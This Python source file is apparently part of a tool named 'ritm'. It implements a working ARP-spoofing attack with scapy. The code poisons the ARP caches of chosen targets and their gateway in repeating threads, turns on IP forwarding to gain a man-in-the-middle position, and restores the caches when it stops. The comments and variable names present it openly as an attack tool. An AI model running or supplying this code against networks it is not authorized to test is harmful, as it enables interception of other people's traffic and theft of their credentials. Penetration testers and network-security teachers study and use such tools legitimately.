import time
from ritm.logger import logger
from scapy.all import *
from threading import Thread, currentThread

IP_FORWARDING_FILE = '/proc/sys/net/ipv4/ip_forward'

class Spoofer:

    def __init__(self, interface, targets, gateway):
        self.__threads = []
        self.__targets = targets
        self.__target_dict = {}
        self.__interface = interface
        self.__gateway = gateway
        self.__gateway_mac = None
        self.__mac = ARP().hwsrc

        logger.debug(f'Attacker\'s MAC is {self.__mac}')


    # get the MAC address of a given IP
    def _get_mac(self, ip):
        try:
            ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0, iface=self.__interface)
            if ans:
                return ans[0][1].src
            return None
        except OSError as e:
            if 'No such device' in str(e):
                logger.error(f'{self.__interface} is not a valid interface')
            else:
                logger.error(str(e))
            exit(1)


    # start ARP spoofing attack so we can obtain MitM position
    def start(self):
        logger.info('Starting spoofer...')
        self.__gateway_mac = self._get_mac(self.__gateway)
        if self.__gateway_mac == None:
            logger.warning('Unable to get gateway\'s MAC, exiting...')
            exit(0)

        for target in self.__targets:
            target_mac = self._get_mac(target)
            if target_mac is None:
                logger.warning(f'Unable to get MAC for target {target}')
            else:
                logger.debug(f'Target {target} has MAC {target_mac}')
                self.__target_dict[target] = target_mac
                target_thread = Thread(target=Spoofer._spoof_target, args=(target, target_mac, self.__gateway, self.__gateway_mac, self.__mac, self.__interface, ), daemon=True)
                gateway_thread = Thread(target=Spoofer._spoof_target, args=(self.__gateway, self.__gateway_mac, target, target_mac, self.__mac, self.__interface, ), daemon=True)
                self.__threads.append(target_thread)
                self.__threads.append(gateway_thread)
        
        if len(self.__threads) == 0:
            logger.warning('Unable to get the MAC address for any specified target, exiting...')
            exit(0)

        logger.info(f'Using {len(self.__threads)} threads for ARP spoofing')
        for thread  in self.__threads:
            thread.start()

    
    # shutdown the spoofer
    def stop(self):
        logger.debug('Killing ARP spoof threads')
        for thread in self.__threads:
            thread.spoof = False
            thread.join()
        
        self._restore()
        Spoofer._disable_ip_forwarding()


    # reset ARP caches of poisoned machines once the attack is finished
    def _restore(self):
        for target_ip, target_mac in self.__target_dict.items():
            # restore target
            packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=self.__gateway, hwsrc=self.__gateway_mac, op=2)
            send(packet, verbose=0, iface=self.__interface)

            # restore gateway
            packet = ARP(pdst=self.__gateway, hwdst=self.__gateway_mac, psrc=target_ip, hwsrc=target_mac, op=2)
            send(packet, verbose=0, iface=self.__interface)

            logger.debug(f'ARP cache for {target_ip} restored')

        logger.debug(f'ARP cache for {self.__gateway} restored')


    # method to handle threaded ARP spoofing
    @staticmethod
    def _spoof_target(target_ip, target_mac, host_ip, host_mac, attacker_mac, interface):
        current_thread = currentThread()
        while getattr(current_thread, "spoof", True):
            logger.debug(f'Spoofing {host_ip} is-at {attacker_mac} to {target_ip}')
            packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op=2)
            send(packet, verbose=0, iface=interface)
            time.sleep(5)
        logger.debug(f'Terminated thread spoofing {host_ip} to {target_ip}')


    @staticmethod
    def _enable_ip_forwarding():
        try:
            with open(IP_FORWARDING_FILE, 'w') as f:
                f.write('1')
            logger.debug('IP forwarding enabled')
        except PermissionError:
            logger.error(f'I need roooot. Unable to open {IP_FORWARDING_FILE}')
            exit()


    @staticmethod
    def _disable_ip_forwarding():
        with open(IP_FORWARDING_FILE, 'w') as f:
            f.write('0')
        logger.debug('IP forwarding disabled')
